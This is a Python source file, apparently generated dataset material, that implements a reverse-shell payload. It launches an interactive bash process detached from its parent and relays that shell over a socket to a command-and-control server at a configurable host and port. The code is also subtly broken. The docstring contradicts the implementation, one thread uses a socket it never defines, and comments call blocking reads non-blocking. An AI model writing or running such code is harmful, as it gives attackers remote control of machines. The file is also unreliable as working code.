import subprocess
import threading
from dataclasses import dataclass, field
from datetime import datetime
import socket
import select
import os

from data.code_scripts_PAST.stage3_DIMOS_test_v3.TASK_001_models import ExecutionResult
from data.code_scripts_PAST.stage3_DIMOS_test_v3.TASK_002_socket_utils import connect_to_c2


def build_reverse_shell_payload(host: str = '192.168.1.1', port: int = 4444) -> ExecutionResult:
    """Construct a reverse shell payload by spawning a subprocess that connects back to the C2 server.
    
    Spawns /bin/sh -i which opens an interactive shell on 0.0.0.0:5522, with stdin/stdout
    piped through a socket connected via connect_to_c2(). Uses threading to handle both
    client connection and subprocess lifecycle concurrently.
    
    Args:
        host: The C2 server hostname or IP address (default '192.168.1.1').
        port: The C2 server port number (default 4444).
        
    Returns:
        ExecutionResult object containing stdout, stderr, return_code, command, and timestamp.
    """
    
    # Start the subprocess that will spawn the interactive shell
    proc = subprocess.Popen(
        ['bash', '-i'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        preexec_fn=os.setsid  # Detach from parent process group
    )
    
    result = ExecutionResult(command='bash -i')
    
    def connect_and_pipe():
        """Thread function: Connect to C2 and pipe subprocess I/O through the socket."""
        try:
            sock = connect_to_c2(host=host, port=port)
            
            # Set up bidirectional piping between process and socket
            proc.stdout.fileno()  # Ensure stdout is connected
            
            while True:
                # Non-blocking read from subprocess stdout
                data = os.read(proc.stdout.fileno(), 4096)
                if not data:
                    break
                
                sock.sendall(data)
                
                # Non-blocking read from socket and write to process stdin
                try:
                    client_data, _ = sock.recvfrom(4096)
                    os.write(proc.stdin.fileno(), client_data)
                except BlockingIOError:
                    pass
                    
        except Exception as e:
            result.stderr += f"Connection error: {str(e)}\n"
            
    def monitor_process():
        """Thread function: Monitor subprocess lifecycle and capture output."""
        try:
            while proc.poll() is None:
                # Read from process stdout
                data = os.read(proc.stdout.fileno(), 4096)
                if not data:
                    break
                
                result.stdout += data.decode('utf-8', errors='replace')
                
                # Write to socket (client receives output)
                try:
                    sock.sendall(data)
                except BlockingIOError:
                    pass
                    
            proc.wait()
            result.return_code = proc.returncode
            
        except Exception as e:
            result.stderr += f"Process error: {str(e)}\n"
            
    # Start both threads
    connect_thread = threading.Thread(target=connect_and_pipe, daemon=True)
    monitor_thread = threading.Thread(target=monitor_process, daemon=True)
    
    connect_thread.start()
    monitor_thread.start()
    
    # Wait for process to complete or timeout
    try:
        proc.wait(timeout=300)  # 5 minute timeout
    except subprocess.TimeoutExpired:
        result.stderr += "Process timed out after 300 seconds.\n"
        
    result.timestamp = datetime.now().isoformat()
    
    return result


if __name__ == '__main__':
    result = build_reverse_shell_payload(host='192.168.1.1', port=4444)
    print(f"Command: {result.command}")
    print(f"Return Code: {result.return_code}")
    print(f"Stdout:\n{result.stdout}")
